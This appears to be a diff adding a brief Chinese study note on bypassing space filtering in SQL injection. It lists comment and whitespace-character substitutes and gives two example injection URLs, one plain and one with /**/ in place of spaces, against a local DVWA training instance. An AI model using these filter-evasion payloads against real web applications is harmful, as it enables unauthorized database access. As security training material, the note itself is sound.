@@ -1,0 +1,8 @@
+面对空格被过滤可以用：
+/**/或assci码的:0x0a,0x0b,0x0c,0x0d
+除了我们刚刚使用的0x0a,0x0b,0x0c,0x0d外还有9号与160号字符可以替换空格（32号本身就是空格)
+例子：
+http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1 ' order by 2 #&Submit=Submit#
+http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1 '/**/order/**/by/**/2/**/#&Submit=Submit#
+
+详细参考：https://www.freebuf.com/articles/web/190266.html
